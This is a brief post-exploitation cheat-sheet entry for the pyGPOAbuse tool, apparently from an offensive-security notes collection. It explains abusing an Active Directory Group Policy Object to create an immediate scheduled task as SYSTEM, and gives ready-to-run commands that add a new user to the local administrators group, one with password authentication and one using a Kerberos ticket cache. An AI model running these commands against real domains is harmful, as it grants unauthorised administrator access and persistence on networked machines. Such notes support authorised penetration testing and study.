# pyGPOAbuse

% Active directory, gpo 
#plateform/linux #target/remote #cat/POSTEXPLOIT/GPO  

## pyGPOAbuse - desc
```
modify an existing GPO that applies to one or more users & computers. It will create an immediate scheduled task as SYSTEM on the remote computer for computer GPO, or as logged in user for user GPO.
```

## pyGPOAbuse - repo
```
https://github.com/Hackndo/pyGPOAbuse
```

## pyGPOAbuse - doc
```
```

## pyGPOAbuse - install
```

```

## immadiat task for computer
```
pygpoabuse.py -gpo-id "gpo_id" -powershell -command 'net user <username|jubeaz> <password|Zaebuj12345+->.. /add;net localgroup administrators <username|jubeaz> /add' -taskname "<task_name|t_jubeaz>" -description "pwn ta face" -f -dc-ip <dc_fqdn> <domain_fqdn>/<user>:<password>
```

## builtin immadiat task for computer (ptt)
add john/HAx00r123.. as local admin
```
python3 pygpoabuse.py -gpo-id "de336708-eb2a-417a-8d62-f234e53037e8"   -dc-ip <dc_fqdn> -k -ccache <ccache> <domain_fqdn>/<user>
```